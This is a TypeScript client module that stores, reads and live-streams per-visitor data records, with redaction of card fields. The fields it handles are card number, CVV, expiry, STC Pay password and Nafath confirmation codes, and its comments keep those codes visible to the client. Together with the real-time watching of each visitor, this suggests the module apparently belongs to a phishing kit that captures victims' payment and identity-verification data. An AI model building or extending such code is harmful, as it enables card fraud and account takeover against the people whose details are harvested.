export type VisitorData = Record<string, any>;

function redactSensitiveFields(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(redactSensitiveFields);
  if (!value || typeof value !== "object") return value;

  return Object.fromEntries(
    Object.entries(value).map(([key, entry]) => {
      const normalized = key.replace(/[_\-\s]/g, "").toLowerCase();
      // Keep nafadConfirmationCode, authNumber, nafadAuthNumber accessible to the client
      const sensitive =
        ["cardnumber", "c2", "c3", "c4", "c5", "cardname", "expirydate",
          "expirymonth", "expiryyear", "cvv", "password", "pass", "stcpassword"].includes(normalized) ||
        normalized.includes("cardnumber") ||
        normalized.includes("cvv") ||
        normalized === "c5";
      return [key, sensitive ? null : redactSensitiveFields(entry)];
    }),
  );
}

function validVisitorId(visitorId: string) {
  return (
    typeof visitorId === "string" &&
    visitorId.trim() !== "" &&
    visitorId !== "null" &&
    visitorId !== "undefined"
  );
}

export async function readVisitorData(
  visitorId: string,
): Promise<VisitorData | null> {
  if (!validVisitorId(visitorId)) return null;

  const response = await fetch(`/api/visitors/${encodeURIComponent(visitorId)}`);
  if (!response.ok) throw new Error("Unable to read visitor data");
  const result = await response.json();
  return result.data ? (redactSensitiveFields(result.data) as VisitorData) : null;
}

export async function updateVisitorData(
  visitorId: string,
  data: VisitorData,
): Promise<void> {
  if (!validVisitorId(visitorId)) {
    console.warn("Skipping visitor update: invalid visitor ID");
    return;
  }

  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const response = await fetch(`/api/visitors/${encodeURIComponent(visitorId)}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ data: data }),
      });
      if (response.ok) return;

      if (attempt === 0 && (response.status === 429 || response.status >= 500)) {
        await new Promise((resolve) => setTimeout(resolve, 350));
        continue;
      }

      console.warn(`[updateVisitorData] HTTP ${response.status} for visitor ${visitorId}`);
      return;
    } catch (netErr) {
      if (attempt === 0) {
        await new Promise((resolve) => setTimeout(resolve, 350));
        continue;
      }
      console.warn("[updateVisitorData] network error:", netErr);
      return;
    }
  }
}

export function watchVisitorData(
  visitorId: string,
  onData: (data: VisitorData | null) => void,
  onError?: (error: unknown) => void,
): () => void {
  if (!validVisitorId(visitorId)) return () => undefined;

  let isDisposed = false;
  let pollTimer: ReturnType<typeof setInterval> | null = null;
  let source: EventSource | null = null;

  // Immediate read so data is available instantly on page mount
  readVisitorData(visitorId)
    .then((data) => {
      if (!isDisposed && data) {
        onData(data);
      }
    })
    .catch(() => {
      // Non-fatal initial read failure, streaming or polling will catch up
    });

  const startPolling = () => {
    if (isDisposed || pollTimer) return;
    pollTimer = setInterval(async () => {
      if (isDisposed) return;
      try {
        const data = await readVisitorData(visitorId);
        if (!isDisposed && data !== undefined) {
          onData(data);
        }
      } catch (err) {
        if (err instanceof Error && err.name !== "AbortError") {
          onError?.(err);
        }
      }
    }, 2000);
  };

  try {
    source = new EventSource(
      `/api/visitors/${encodeURIComponent(visitorId)}/stream`,
    );

    source.onmessage = (event) => {
      if (isDisposed) return;
      try {
        const result = JSON.parse(event.data);
        onData(result.data ? (redactSensitiveFields(result.data) as VisitorData) : null);
      } catch (error) {
        onError?.(error);
      }
    };

    source.onerror = () => {
      if (isDisposed) return;
      // If the SSE connection closes permanently, gracefully fall back to polling
      if (source && source.readyState === EventSource.CLOSED) {
        try {
          source.close();
        } catch {
          // ignore
        }
        source = null;
        startPolling();
      }
    };
  } catch {
    // If EventSource is unsupported or fails to construct, fall back to polling
    startPolling();
  }

  return () => {
    isDisposed = true;
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
    if (source) {
      try {
        source.close();
      } catch {
        // ignore
      }
      source = null;
    }
  };
}